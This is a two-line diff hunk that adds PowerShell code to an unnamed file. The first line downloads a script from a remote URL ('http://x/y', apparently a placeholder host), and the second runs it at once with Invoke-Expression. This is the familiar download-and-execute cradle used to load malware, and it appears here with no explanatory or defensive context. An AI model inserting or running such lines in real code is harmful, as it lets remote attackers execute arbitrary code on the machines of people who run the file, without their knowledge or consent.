@@ -1,0 +1,2 @@
+$script = (New-Object System.Net.WebClient).DownloadString("http://x/y")
+Invoke-Expression $script
